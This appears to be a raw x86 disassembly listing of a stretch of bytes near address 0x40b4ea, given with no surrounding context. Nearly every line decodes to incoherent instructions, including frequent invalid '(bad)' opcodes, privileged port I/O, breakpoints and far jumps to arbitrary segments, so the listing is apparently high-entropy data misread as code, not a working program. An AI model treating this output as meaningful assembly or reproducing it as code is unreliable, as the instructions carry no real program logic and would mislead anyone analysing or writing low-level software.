  40b4ea:	mov    edx,0x99c19df4
  40b4ef:	cmc    
  40b4f0:	fistp  QWORD PTR [ecx+0x6b]
  40b4f3:	xchg   esp,eax
  40b4f4:	push   0x1e
  40b4f6:	popf   
  40b4f7:	outs   dx,BYTE PTR ds:[esi]
  40b4f8:	fiadd  WORD PTR [edi+0x5c67ca4]
  40b4fe:	jl     0x40b517
  40b500:	popf   
  40b501:	xchg   edi,eax
  40b502:	int3   
  40b503:	out    0xfe,al
  40b505:	mov    eax,0x464dbee2
  40b50a:	je     0x40b545
  40b50c:	pop    eax
  40b50d:	add    eax,0xceb1b4a7
  40b512:	dec    ecx
  40b513:	sub    DWORD PTR [esi+edx*1+0x41],ecx
  40b517:	adc    al,0x85
  40b519:	pop    ebx
  40b51a:	mov    ?,WORD PTR [ebx]
  40b51c:	jmp    0x3c22:0xfb9b3757
  40b523:	jnp    0x40b577
  40b525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b526:	jp     0x40b51a
  40b528:	inc    eax
  40b529:	inc    ebp
  40b52a:	sub    DWORD PTR [esi],eax
  40b52c:	xchg   ebx,eax
  40b52d:	pop    edx
  40b52e:	inc    ebx
  40b52f:	jnp    0x40b5a7
  40b531:	es cwde 
  40b533:	(bad)  [edi-0x7d2d0ad0]
  40b539:	not    BYTE PTR [esi+eiz*2+0xae5a0c6]
  40b540:	shl    DWORD PTR [esi-0x754c5405],1
  40b546:	mov    edi,0xc85b0b67
  40b54b:	enter  0x8cf1,0x14
  40b54f:	cli    
  40b550:	pop    ebp
  40b551:	int3   
  40b552:	mov    eax,ds:0x520dadf9
  40b557:	imul   edx,DWORD PTR [esi+0x7ca5c5fa],0x76
  40b55e:	add    BYTE PTR [esi+ebx*8],al
  40b561:	frstor [esi+ebx*2]
  40b564:	xor    DWORD PTR [esp+eax*1-0x27],ecx
  40b568:	add    BYTE PTR [eax-0x65],ah
  40b56b:	scas   eax,DWORD PTR es:[edi]
  40b56c:	xchg   ebx,eax
  40b56d:	cs jbe 0x40b57f
  40b570:	outs   dx,BYTE PTR ds:[esi]
  40b571:	mov    bh,cl
  40b573:	pop    es
  40b574:	fimul  WORD PTR [eax+0x7e]
  40b577:	or     dh,al
  40b579:	mov    esi,0x75268739
  40b57e:	out    dx,al
  40b57f:	fldenv [ecx]
  40b581:	mov    eax,ds:0x5723c524
  40b586:	mov    dh,BYTE PTR [ebx]
  40b588:	push   edx
  40b589:	push   eax
  40b58a:	test   BYTE PTR [esi+0x9],ah
  40b58d:	mov    ebx,0xde087eeb
  40b592:	ja     0x40b594
  40b594:	icebp  
  40b595:	cli    
  40b596:	mov    eax,0xe666ceee
  40b59b:	sbb    BYTE PTR [ecx],0xa2
  40b59e:	or     eax,0x89a38d20
  40b5a3:	(bad)  [edi]
  40b5a5:	pop    ebx
  40b5a6:	pop    ebx
  40b5a7:	xor    al,BYTE PTR [esi-0x112984fc]
  40b5ad:	ror    DWORD PTR [edi-0x17fd8003],1
  40b5b3:	adc    dh,ch
  40b5b5:	pop    edi
  40b5b6:	adc    ah,BYTE PTR [ebx+0x12]
  40b5b9:	stos   DWORD PTR es:[edi],eax
  40b5ba:	das    
  40b5bb:	pop    edx
  40b5bc:	fsub   QWORD PTR [ecx]
  40b5be:	mov    al,ds:0x6052309b
  40b5c3:	or     BYTE PTR [ebp+0x3],bl
  40b5c6:	mov    bl,0x5f
  40b5c8:	stc    
  40b5c9:	inc    BYTE PTR [ecx-0x4ca7c729]
  40b5cf:	push   ebx
  40b5d0:	les    esp,FWORD PTR [eax-0xb92077f]
  40b5d6:	sbb    al,0xf2
  40b5d8:	add    al,0x7f
  40b5da:	mov    ebp,0xd1d13e26
  40b5df:	xchg   ebp,eax
  40b5e0:	mov    ah,0xd7
  40b5e2:	push   ss
  40b5e3:	xchg   ebp,eax
  40b5e4:	jnp    0x40b5f6
  40b5e6:	or     eax,0x357992f5
  40b5eb:	(bad)  
  40b5ec:	mov    esi,0xf6f4a085
  40b5f1:	xor    eax,0xe440815e
  40b5f6:	ret    0xb3ed
  40b5f9:	int3   
  40b5fa:	adc    DWORD PTR [esi-0x5],ebx
  40b5fd:	stos   BYTE PTR es:[edi],al
  40b5fe:	mov    eax,0xbdc6e7cd
  40b603:	xchg   DWORD PTR [edx+0x2224c115],ebp
  40b609:	pop    ds
  40b60a:	bound  esi,QWORD PTR [eax-0x2f28aa82]
  40b610:	leave  
  40b611:	out    dx,al
  40b612:	popa   
  40b613:	add    al,0x13
  40b615:	leave  
  40b616:	sti    
  40b617:	add    eax,0x203398b9
  40b61c:	fnstenv [ebx+0x153280d3]
  40b622:	push   edx
  40b623:	xchg   esp,eax
  40b624:	daa    
  40b625:	pop    esi
  40b626:	and    eax,0x52ac1bfe
  40b62b:	clc    
  40b62c:	arpl   WORD PTR [ebx],cx
  40b62e:	in     al,dx
  40b62f:	mov    al,ds:0xbe9a8d31
  40b634:	add    esp,DWORD PTR [edx-0x2381b480]
  40b63a:	leave  
  40b63b:	jbe    0x40b5cd
  40b63d:	and    BYTE PTR [eax],ah
  40b63f:	outs   dx,BYTE PTR ds:[esi]
  40b640:	pop    edx
  40b641:	pusha  
  40b642:	sar    BYTE PTR [edi+0x4d],1
  40b645:	mov    ch,0x4c
  40b647:	stos   BYTE PTR es:[edi],al
  40b648:	loopne 0x40b6c6
  40b64a:	and    al,0x8d
  40b64c:	pop    ecx
  40b64d:	and    al,BYTE PTR [edi+0x61]
  40b650:	xor    cl,BYTE PTR [edi]
  40b652:	jbe    0x40b5de
  40b654:	outs   dx,BYTE PTR ds:[esi]
  40b655:	cmp    dl,BYTE PTR [ebx+0x72638bbf]
  40b65b:	adc    bl,BYTE PTR [edx-0x24]
  40b65e:	jg     0x40b620
  40b660:	adc    al,0x76
  40b662:	lahf   
  40b663:	pusha  
  40b664:	cdq    
  40b665:	dec    ebx
  40b666:	mov    ds:0x6f596d05,al
  40b66b:	mov    bl,0xcb
  40b66d:	xor    al,0xd9
  40b66f:	sti    
  40b670:	sbb    DWORD PTR [eax+0x222947e8],esp
  40b676:	mov    al,0x31
  40b678:	pop    edx
  40b679:	or     al,0xe6
  40b67b:	shl    bh,0xd
  40b67e:	mov    cl,0x9c
  40b680:	adc    dh,dl
  40b682:	cmp    ah,BYTE PTR [esi-0x74ac1d4f]
  40b688:	lock fwait
  40b68a:	lods   al,BYTE PTR ds:[esi]
  40b68b:	xchg   edx,eax
  40b68c:	dec    eax
  40b68d:	pusha  
  40b68e:	sbb    al,0xed
  40b690:	xor    DWORD PTR [ebx],0x70
  40b693:	loop   0x40b62a
  40b695:	adc    bl,BYTE PTR [ecx]
  40b697:	or     eax,0x6a956182
  40b69c:	repnz or edi,DWORD PTR [edi-0x45]
  40b6a0:	push   ss
  40b6a1:	pop    es
  40b6a2:	out    0xc5,al
  40b6a4:	icebp  
  40b6a5:	(bad)  
  40b6a6:	mov    gs,ebx
  40b6a8:	(bad)
  40b6ac:	inc    ecx
  40b6ad:	shr    BYTE PTR [edi+ecx*8],0x6
  40b6b1:	xchg   ebp,eax
  40b6b2:	jl     0x40b6a6
  40b6b4:	adc    BYTE PTR [edx],0xf3
  40b6b7:	out    0xe1,eax
  40b6b9:	not    ebx
  40b6bb:	jmp    0xce4f:0xa98137ac
  40b6c2:	mov    ebx,0x13e6344e
  40b6c7:	scas   al,BYTE PTR es:[edi]
  40b6c8:	sahf   
  40b6c9:	push   esp
  40b6ca:	gs inc eax
  40b6cc:	lahf   
  40b6cd:	xlat   BYTE PTR ds:[ebx]
  40b6ce:	inc    ebx
  40b6cf:	inc    ebx
  40b6d0:	pop    edi
  40b6d1:	es mov edx,0x8fb72fef
  40b6d7:	aaa    
  40b6d8:	mov    bl,0x8b
  40b6da:	or     eax,0xe1021d7d
  40b6df:	jge    0x40b715
  40b6e1:	pop    ss
  40b6e2:	and    dl,dl
  40b6e4:	je     0x40b6ff
  40b6e6:	xchg   BYTE PTR [edx],ah
  40b6e8:	add    eax,0x22cf6e23
  40b6ee:	inc    ebx
  40b6ef:	xchg   ebp,eax
  40b6f0:	daa    
  40b6f1:	jnp    0x40b72b
  40b6f3:	push   0x33
  40b6f5:	mov    bl,0xcf
  40b6f7:	xchg   ebx,eax
  40b6f8:	dec    ebp
  40b6f9:	xchg   DWORD PTR [eax+0x1f],ecx
  40b6fc:	(bad)  
  40b6fd:	jg     0x40b688
  40b6ff:	loop   0x40b6a8
  40b701:	cld    
  40b702:	ins    BYTE PTR es:[edi],dx
  40b703:	mov    al,0xa7
  40b705:	test   al,0x7e
  40b707:	xchg   BYTE PTR [eax],ah
  40b709:	and    al,0x45
  40b70b:	mov    DWORD PTR [esi-0x3ff8f936],ebx
  40b711:	mov    ds:0x8a021e0c,al
  40b716:	lea    edi,[ebp-0x66b682b6]
  40b71c:	cld    
  40b71d:	cmp    al,BYTE PTR [eax-0x4d925a82]
  40b723:	pop    esi
  40b724:	cmp    cl,bl
  40b726:	aad    0x46
  40b728:	jle    0x40b6ad
  40b72a:	fst    QWORD PTR [esi]
  40b72c:	adc    ah,BYTE PTR [edx+ecx*2+0x31]
  40b730:	push   edi
  40b731:	out    dx,eax
  40b732:	and    esi,DWORD PTR [esi+0x52]
  40b735:	adc    al,0x31
  40b737:	cwde   
  40b738:	cmc    
  40b739:	add    DWORD PTR [ebx-0x3d],esi
  40b73c:	std    
  40b73d:	in     eax,dx
  40b73e:	inc    edi
  40b73f:	jg     0x40b7ae
  40b741:	rol    DWORD PTR [edx-0x13],cl
  40b744:	mov    ebx,0xb1b2cdd2
  40b749:	sub    edx,DWORD PTR [ebp-0x3031dfe1]
  40b74f:	inc    ebp
  40b750:	adc    eax,0xa49aaaff
  40b755:	inc    edi
  40b756:	std    
  40b757:	push   esi
  40b758:	shl    DWORD PTR [esi],0x78
  40b75b:	mov    ch,0xc1
  40b75d:	shl    BYTE PTR [eax+0x21],0xf3
  40b761:	nop
  40b762:	lock xor DWORD PTR [ebp-0x3ca1bc82],edi
  40b769:	sub    ah,BYTE PTR [eax+0x36795987]
  40b76f:	jo     0x40b788
  40b771:	adc    esp,DWORD PTR [ebx]
  40b773:	adc    esp,ebp
  40b775:	and    DWORD PTR [eax+ebp*1+0x3ffe8320],eax
  40b77c:	out    0xd5,eax
  40b77e:	cwde   
  40b77f:	pop    es
  40b780:	sub    eax,0x11a93211
  40b785:	jno    0x40b7f3
  40b787:	mov    eax,0x94d91968
  40b78c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b78d:	pop    ecx
  40b78e:	dec    edi
  40b78f:	xchg   ecx,eax
  40b790:	xchg   ebp,eax
  40b791:	cmp    al,0xa1
  40b793:	adc    eax,0x287831b1
  40b798:	adc    al,0x93
  40b79a:	ficom  DWORD PTR [ecx]
  40b79c:	cwde   
  40b79d:	inc    esi
  40b79e:	mov    bh,0x9a
  40b7a0:	imul   eax,DWORD PTR [ecx],0x83e2697d
  40b7a6:	popf   
  40b7a7:	adc    al,BYTE PTR [ebx]
  40b7a9:	and    eax,DWORD PTR [ebx+ecx*8+0x4d]
  40b7ad:	sar    DWORD PTR [esp+ebx*4+0x3c],0xea
  40b7b2:	les    ebx,FWORD PTR [ebp+0x6378ce97]
  40b7b8:	xchg   edi,eax
  40b7b9:	inc    ebx
  40b7ba:	mov    ah,0x8
  40b7bc:	jns    0x40b7b4
  40b7be:	mov    cl,0x34
  40b7c0:	addr16 retf 0xfdd0
  40b7c4:	stos   BYTE PTR es:[edi],al
  40b7c5:	xchg   ebx,eax
  40b7c6:	add    BYTE PTR [eax],dl
  40b7c8:	push   0x1a
  40b7ca:	xor    DWORD PTR [ebx-0x1b],0x599c60ab
  40b7d1:	int3   
  40b7d2:	pop    esp
  40b7d3:	sar    DWORD PTR [ecx+0x58e63ad7],1
  40b7d9:	daa    
  40b7da:	in     al,0xfa
  40b7dc:	cs pushf 
  40b7de:	pop    ebp
  40b7df:	xor    eax,0x306a432f
  40b7e4:	mov    ebx,edx
  40b7e6:	fwait
  40b7e7:	add    esp,DWORD PTR [ebp-0x441f9e68]
  40b7ed:	fmul   DWORD PTR [ebx-0x25375211]
  40b7f3:	mov    WORD PTR [edi-0xd6e98c4],gs
  40b7f9:	ins    DWORD PTR es:[edi],dx
  40b7fa:	hlt    
  40b7fb:	push   eax
  40b7fc:	out    dx,al
  40b7fd:	push   0x4d96ec7f
  40b802:	adc    eax,0x17d17e04
  40b807:	xchg   esi,eax
  40b808:	mov    esi,0x71314c66
  40b80d:	int    0x4f
  40b80f:	ret    
  40b810:	and    DWORD PTR [ebx+0x67],ebp
  40b813:	ret    0x82d9
  40b816:	loopne 0x40b87d
  40b818:	dec    ebx
  40b819:	jl     0x40b7a2
  40b81b:	into   
  40b81c:	add    BYTE PTR [ebx+0x58],0x1f
  40b820:	nop
  40b821:	clc    
  40b822:	or     eax,0xb399ceb1
  40b827:	xor    eax,DWORD PTR ds:0x21c21d59
  40b82d:	xchg   BYTE PTR [eax-0x2e],ah
  40b830:	pop    ds
  40b831:	adc    al,0x16
  40b833:	dec    edx
  40b834:	dec    eax
  40b835:	and    al,0x9e
  40b837:	lock pop esp
  40b839:	adc    eax,0x5891d901
  40b83e:	in     al,dx
  40b83f:	std    
  40b840:	xlat   BYTE PTR ds:[ebx]
  40b841:	in     eax,0xb3
  40b843:	jg     0x40b845
  40b845:	mov    esi,0x2a2484da
  40b84a:	ss inc ecx
  40b84c:	pop    esp
  40b84d:	jl     0x40b852
  40b84f:	pop    ss
  40b850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b851:	xchg   ebp,eax
  40b852:	ret    0x8aa4
  40b855:	add    edi,DWORD PTR [ebp+0x28]
  40b858:	jge    0x40b825
  40b85a:	dec    esp
  40b85b:	pop    ecx
  40b85c:	ficom  DWORD PTR [eax]
  40b85e:	jge    0x40b890
  40b860:	pop    edi
  40b861:	adc    eax,0x63db594b
  40b866:	fwait
  40b867:	cs and al,0x66
  40b86a:	fisttp DWORD PTR ds:0xc06ac6b6
  40b870:	dec    ebx
  40b871:	push   eax
  40b872:	mov    ch,0x32
  40b874:	adc    eax,DWORD PTR [eax+ecx*4]
  40b877:	cli    
  40b878:	mov    edi,0x6efcd789
  40b87d:	gs sbb edx,edi
  40b880:	and    DWORD PTR [edx-0x78971a32],esp
  40b886:	dec    ecx
  40b887:	xor    al,BYTE PTR [ebx+0x7f]
  40b88a:	xor    eax,0xf82f64b6
  40b88f:	mov    dh,0xcb
  40b891:	mov    ebp,0x75e47964
  40b896:	mov    eax,0x765939e5
  40b89b:	push   ebp
  40b89c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b89d:	gs iret 
  40b89f:	add    DWORD PTR [esi],ebx
  40b8a1:	dec    ebx
  40b8a2:	xchg   BYTE PTR [edx-0x15],cl
  40b8a5:	aam    0x3f
  40b8a7:	inc    cx
  40b8a9:	xor    eax,0x5b8c5f64
  40b8ae:	pop    ebp
  40b8af:	sub    al,0x3f
  40b8b1:	data16 test BYTE PTR [ebx+0x988ac04],al
  40b8b8:	mov    bl,0xfd
  40b8ba:	js     0x40b90f
  40b8bc:	dec    eax
  40b8bd:	dec    ebp
  40b8be:	into   
  40b8bf:	cs fs lock ins BYTE PTR es:[edi],dx
  40b8c3:	aas    
  40b8c4:	retf   0x7674
  40b8c7:	fsubp  st(5),st
  40b8c9:	(bad)  
  40b8cb:	adc    eax,0x67ecf08a
  40b8d0:	out    dx,al
  40b8d1:	fs inc ebp
  40b8d3:	dec    edx
  40b8d4:	fst    DWORD PTR [esi]
  40b8d6:	pop    es
  40b8d7:	loop   0x40b8c8
  40b8d9:	inc    ebx
  40b8da:	xchg   esp,eax
  40b8db:	and    bh,BYTE PTR [edx+0x5da502c6]
  40b8e1:	add    eax,DWORD PTR [esi+ebp*2]
  40b8e4:	jg     0x40b924
  40b8e6:	es xor al,0x8
  40b8e9:	call   0x8fa2:0x8e9c375f
  40b8f0:	mov    esi,0x28fe3e2e
  40b8f5:	add    DWORD PTR [esi],edx
  40b8f7:	jmp    0x40b900
  40b8f9:	inc    ebp
  40b8fa:	pop    ss
  40b8fb:	rol    BYTE PTR [eax-0x47],1
  40b8fe:	jmp    0x40b8c7
  40b900:	pop    ebx
  40b901:	or     eax,0xaadda66f
  40b906:	(bad)
  40b90a:	clc    
  40b90b:	adc    DWORD PTR [ebp+0x1f],edi
  40b90e:	cmp    eax,0x18694d6e
  40b913:	in     al,0xee
  40b915:	adc    eax,0xc43af05f
  40b91a:	add    al,0x1e
  40b91c:	pop    eax
  40b91d:	loopne 0x40b962
  40b91f:	add    ch,BYTE PTR [edi*1+0x5e514513]
  40b926:	add    BYTE PTR [edi+0x69],ah
  40b929:	mov    ecx,0x33f63678
  40b92e:	and    cl,BYTE PTR [edi+0x48]
  40b931:	test   al,0x3f
  40b933:	(bad)  
  40b934:	leave  
  40b935:	call   0x2f7400bc
  40b93a:	xor    cl,bl
  40b93c:	fcmovnu st,st(5)
  40b93e:	fiadd  DWORD PTR [esi]
  40b940:	adc    edx,DWORD PTR [edi-0x36]
  40b943:	mov    WORD PTR [ecx+ebx*2-0x43d2bae6],?
  40b94a:	dec    eax
  40b94b:	inc    edx
  40b94c:	xchg   ecx,eax
  40b94d:	push   0x12c3bce0
  40b952:	dec    eax
  40b953:	cdq    
  40b954:	mov    ?,WORD PTR [esi+0x7a8b499d]
  40b95a:	push   edx
  40b95b:	dec    esp
  40b95c:	lock dec ebx
  40b95e:	push   es
  40b95f:	xchg   ebx,eax
  40b960:	mov    fs,WORD PTR [edi+0x4febe8b9]
  40b966:	mov    edi,DWORD PTR [edx-0x56faee9]
  40b96c:	(bad)  
  40b96d:	outs   dx,BYTE PTR ds:[esi]
  40b96e:	ret    
  40b96f:	xchg   ecx,eax
  40b970:	mov    ebp,DWORD PTR [edi]
  40b972:	loop   0x40b9e7
  40b974:	les    edx,FWORD PTR [ebp-0x755e5d35]
  40b97a:	mov    ah,bh
  40b97c:	sub    BYTE PTR [ebx],al
  40b97e:	es (bad) 
  40b980:	fsubr  DWORD PTR [esi]
  40b982:	mov    bh,0x24
  40b984:	jl     0x40b993
  40b986:	rol    BYTE PTR [ecx+0x0],0x48
  40b98a:	sbb    al,0x16
  40b98c:	push   ss
  40b98d:	or     edi,DWORD PTR [eax-0x31]
  40b990:	inc    ebp
  40b991:	jno    0x40b9f0
  40b993:	iret   
  40b994:	imul   ebx,DWORD PTR [edi-0x2865ce27],0x97f4263c
  40b99e:	or     edx,ebp
  40b9a0:	sbb    al,0x49
  40b9a2:	dec    ebp
  40b9a3:	and    ebp,ebx
  40b9a5:	jb     0x40b9b6
  40b9a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9a8:	inc    edi
  40b9a9:	dec    ebp
  40b9aa:	imul   edi,ebx,0xd
  40b9ad:	xchg   DWORD PTR ss:[edi],esp
  40b9b0:	xchg   BYTE PTR [edi],bh
  40b9b2:	pop    es
  40b9b3:	in     al,dx
  40b9b4:	add    esp,DWORD PTR [ebp+0x10]
  40b9b7:	mov    ch,0x10
  40b9b9:	leave  
  40b9ba:	mov    bh,0x8a
  40b9bc:	pop    esi
  40b9bd:	es push ss
  40b9bf:	(bad)  
  40b9c0:	gs jle 0x40b975
  40b9c3:	dec    DWORD PTR [edi]
  40b9c5:	pop    esp
  40b9c6:	mov    ebp,0x872383ba
  40b9cb:	xchg   DWORD PTR [ebx],ebp
  40b9cd:	mov    ds:0x442e705a,eax
  40b9d2:	inc    edx
  40b9d3:	popf   
  40b9d4:	das    
  40b9d5:	or     DWORD PTR [ebx-0x7d],edi
  40b9d8:	and    BYTE PTR [edi+0x13d8b768],dh
  40b9de:	pop    ecx
  40b9df:	cmp    ebp,DWORD PTR [eax]
  40b9e1:	and    DWORD PTR [ecx+0x17650423],esp
  40b9e7:	neg    BYTE PTR [ecx+0x12]
  40b9ea:	cmc    
  40b9eb:	cmc    
  40b9ec:	pop    edi
  40b9ed:	(bad)  
  40b9ef:	or     edx,ecx
  40b9f1:	ret    0xa0ed
  40b9f4:	iret   
  40b9f5:	jmp    0x46:0x4b959768
  40b9fc:	and    cl,BYTE PTR [ebx+0x5518e7da]
  40ba02:	jg     0x40b9aa
  40ba04:	push   0xfb113e91
  40ba09:	xor    esp,ebx
  40ba0b:	fisubr WORD PTR [ebx]
  40ba0d:	sbb    bh,0x67
  40ba10:	idiv   DWORD PTR [esi-0x46]
  40ba13:	push   esp
  40ba14:	shr    BYTE PTR [edi-0x78df7650],1
  40ba1a:	sahf   
  40ba1b:	stc    
  40ba1c:	sub    eax,0x442451d2
  40ba21:	sub    al,dl
  40ba23:	imul   esi,esi,0xffffffc4
  40ba26:	pusha  
  40ba27:	stc    
  40ba28:	dec    edi
  40ba29:	jl     0x40ba58
  40ba2b:	mov    bl,0x72
  40ba2d:	inc    ecx
  40ba2e:	retf   
  40ba2f:	xor    BYTE PTR [edx],bh
  40ba31:	pop    edx
  40ba32:	cdq    
  40ba33:	outs   dx,BYTE PTR ds:[esi]
  40ba34:	lods   eax,DWORD PTR ds:[esi]
  40ba35:	ins    BYTE PTR es:[edi],dx
  40ba36:	addr16 mov ds:0x69ff,al
  40ba3a:	shr    DWORD PTR [edi],cl
  40ba3c:	push   esp
  40ba3d:	xor    ebp,DWORD PTR [edi+edx*2-0x80]
  40ba41:	mov    ds:0x5db2c842,al
  40ba46:	imul   ch
  40ba48:	call   esp
  40ba4a:	fnstsw WORD PTR [ebx+ecx*2]
  40ba4d:	xor    BYTE PTR [edx-0x7],bl
  40ba50:	das    
  40ba51:	cmp    eax,0x92eac615
  40ba56:	(bad)  
  40ba57:	push   0x263dd2ac
  40ba5c:	pusha  
  40ba5d:	int    0x31
  40ba5f:	std    
  40ba60:	pop    eax
  40ba61:	stos   BYTE PTR es:[edi],al
  40ba62:	daa    
  40ba63:	add    eax,DWORD PTR [ecx]
  40ba65:	sub    al,0x13
  40ba67:	push   cs
  40ba68:	cmp    ch,BYTE PTR [ecx+esi*1-0x55b41839]
  40ba6f:	test   BYTE PTR es:[esi],ch
  40ba72:	test   BYTE PTR [edi-0x7f217803],0xd4
  40ba79:	xchg   esp,eax
  40ba7a:	cmp    BYTE PTR [ebx+0x63b6f68a],dh
  40ba80:	call   0x64857615
  40ba85:	call   0xf97e:0x2bc5b7b3
  40ba8c:	xor    al,BYTE PTR cs:[esi]
  40ba8f:	push   esp
  40ba90:	and    DWORD PTR [ecx+0x5a203f4c],ecx
  40ba96:	mov    bh,0xd5
  40ba98:	sub    DWORD PTR [ebx-0x61],ebp
  40ba9b:	pop    ds
  40ba9c:	fs (bad) 
  40ba9e:	xchg   esi,eax
  40ba9f:	jo     0x40ba95
  40baa1:	pop    ecx
  40baa2:	add    BYTE PTR [ebx+0x6f],bl
  40baa5:	loope  0x40bacd
  40baa7:	sub    edx,ecx
  40baa9:	out    0xd9,al
  40baab:	xchg   edx,eax
  40baac:	ja     0x40baf9
  40baae:	cmp    DWORD PTR ds:0xe37dcf7e,edi
  40bab4:	inc    edi
  40bab5:	pop    edx
  40bab6:	fdivr  DWORD PTR [esi]
  40bab8:	mov    ebx,0xf511813
  40babd:	sub    eax,0x25684e44
  40bac2:	dec    esp
  40bac3:	xor    al,0x0
  40bac5:	into   
  40bac6:	ss cwde 
  40bac8:	mov    eax,ds:0x5da54ddb
  40bacd:	or     BYTE PTR [edi-0x19],cl
  40bad0:	nop
  40bad1:	xor    al,0x50
  40bad3:	scas   al,BYTE PTR es:[edi]
  40bad4:	push   ebp
  40bad5:	sub    al,0x39
  40bad7:	ss add eax,0x6e94b086
  40badd:	jmp    0x40baf3
  40badf:	mov    bh,0x3f
  40bae1:	test   eax,ecx
  40bae3:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae5:	daa    
  40bae6:	nop
  40bae7:	sbb    BYTE PTR [edx-0x25ebe9c2],dh
  40baed:	xor    ch,bl
  40baef:	(bad)  
  40baf0:	dec    esi
  40baf1:	repz (bad) 
  40baf3:	mul    DWORD PTR [eax+edi*1+0x287e279d]
  40bafa:	xchg   ebp,eax
  40bafb:	test   eax,esp
  40bafd:	or     bl,dh
  40baff:	lahf   
  40bb00:	mov    eax,ds:0xe1dae1cc
  40bb05:	(bad)  
  40bb06:	mov    DWORD PTR [ebp-0x5fdb4d35],eax
  40bb0c:	in     al,dx
  40bb0d:	add    ecx,DWORD PTR [edx-0x64]
  40bb10:	(bad)  
  40bb11:	sbb    ebx,DWORD PTR [edi]
  40bb13:	mov    edx,0xafe9b56d
  40bb18:	lds    edx,FWORD PTR [esi]
  40bb1a:	aas    
  40bb1b:	jb     0x40bb78
  40bb1d:	rcr    BYTE PTR [ecx-0x1cc00feb],cl
  40bb23:	jo     0x40bb41
  40bb25:	in     al,0xeb
  40bb27:	cmp    esp,esp
  40bb29:	out    0x42,eax
  40bb2b:	adc    eax,0xac464371
  40bb30:	mov    al,ds:0xc55a7adc
  40bb35:	push   0x42
  40bb37:	(bad)  
  40bb38:	lods   eax,DWORD PTR ds:[esi]
  40bb39:	xchg   edx,eax
  40bb3a:	push   ds
  40bb3b:	mov    ch,0x41
  40bb3d:	(bad)  
  40bb3e:	cmp    al,0x3b
  40bb40:	fsub   st(0),st
  40bb42:	sub    DWORD PTR [esi],esp
  40bb44:	pop    ss
  40bb45:	repz fs aam 0x2b
  40bb49:	fcomp  QWORD PTR ds:0xba64715e
  40bb4f:	jbe    0x40bb73
  40bb51:	sbb    eax,0x11ea839c
  40bb56:	mov    ah,0xca
  40bb58:	mov    dl,0x4
  40bb5a:	inc    edx
  40bb5b:	pop    esi
  40bb5c:	mov    ecx,0x71826f4d
  40bb61:	pusha  
  40bb62:	mov    edi,0x204dfd6
  40bb67:	pop    esi
  40bb68:	loopne 0x40bb13
  40bb6a:	sbb    BYTE PTR [esi-0x49],bl
  40bb6d:	jecxz  0x40bbc4
  40bb6f:	dec    edi
  40bb70:	add    bh,0xf
  40bb73:	xchg   edi,eax
  40bb74:	or     dl,BYTE PTR [edi+0x4e]
  40bb77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb78:	hlt    
  40bb79:	and    dh,dh
  40bb7b:	xchg   esi,eax
  40bb7c:	pop    esp
  40bb7d:	in     eax,0x6c
  40bb7f:	arpl   WORD PTR [edx+0x4e733892],bp
  40bb85:	and    DWORD PTR [eax+0xd3727f5],edx
  40bb8b:	int3   
  40bb8c:	mov    ebx,0xbe7bda01
  40bb91:	mov    dl,0x86
  40bb93:	dec    esi
  40bb94:	xchg   edi,eax
  40bb95:	sub    bh,ch
  40bb97:	cdq    
  40bb98:	mov    edi,0x84b04abc
  40bb9d:	aad    0x28
  40bb9f:	xchg   ebp,eax
  40bba0:	idiv   ebp
  40bba2:	shl    BYTE PTR [esi+0x51eee02],1
  40bba8:	xchg   ecx,eax
  40bba9:	inc    esi
  40bbaa:	rcl    cl,1
  40bbac:	sbb    cl,BYTE PTR [ebp-0x68]
  40bbaf:	nop
  40bbb0:	sbb    al,0xa7
  40bbb2:	mov    ah,0x3c
  40bbb4:	mov    ds:0x905aca37,eax
  40bbb9:	mov    ebx,0xe3d13f73
  40bbbe:	test   eax,0x1f09fbc
  40bbc3:	mov    ah,0xec
  40bbc5:	mov    WORD PTR [eax-0x28],es
  40bbc8:	ret    0x3b18
  40bbcb:	sbb    edx,esp
  40bbcd:	adc    al,0xd4
  40bbcf:	fldenv [edi-0x2a681eda]
  40bbd5:	fld    TBYTE PTR [ebp+0x5c9e0e9d]
  40bbdb:	lahf   
  40bbdc:	add    al,0xd0
  40bbde:	push   0x61f0cd0d
  40bbe3:	push   es
  40bbe4:	pop    eax
  40bbe5:	jo     0x40bc5e
  40bbe7:	mov    bl,0xaa
  40bbe9:	ror    DWORD PTR [edx+0x10eed324],1
  40bbef:	sti    
  40bbf0:	fs inc esi
  40bbf2:	popf   
  40bbf3:	iret   
  40bbf4:	cmc    
  40bbf5:	rcr    DWORD PTR [ecx+0x5565b7ba],0xa0
  40bbfc:	in     eax,dx
  40bbfd:	ret    0xe805
  40bc00:	or     eax,0xd59b1676
  40bc05:	fmul   st(6),st
  40bc07:	mov    al,0xcf
  40bc09:	das    
  40bc0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc0b:	bnd call 0x91c7d228
  40bc11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc12:	push   edx
  40bc13:	add    esp,esi
  40bc15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc16:	push   esp
  40bc17:	mov    ebx,0x9e29cf3c
  40bc1c:	cmp    eax,0x1b226959
  40bc21:	push   edi
  40bc22:	sbb    DWORD PTR [ecx-0x133e8422],ebx
  40bc28:	not    BYTE PTR [eax-0x2ba02156]
  40bc2e:	mov    eax,0x1c41f92f
  40bc33:	xor    eax,0x90be696f
  40bc38:	das    
  40bc39:	loop   0x40bc3f
  40bc3b:	adc    ah,BYTE PTR [eax*1+0x19ab7fd6]
  40bc42:	jo     0x40bc97
  40bc44:	xchg   ecx,eax
  40bc45:	jne    0x40bc91
  40bc47:	shl    BYTE PTR [ebx+0x4ef84fff],0x10
  40bc4e:	mov    ch,0xb
  40bc50:	(bad)  
  40bc51:	inc    BYTE PTR [eax]
  40bc53:	xchg   esi,eax
  40bc54:	pop    esi
  40bc55:	repz pop ss
  40bc57:	fwait
  40bc58:	shl    DWORD PTR [edx-0x1b],0xdb
  40bc5c:	sub    al,0x97
  40bc5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc5f:	and    al,0xcf
  40bc61:	nop
  40bc62:	fcmovnbe st,st(7)
  40bc64:	dec    esp
  40bc65:	xchg   edx,eax
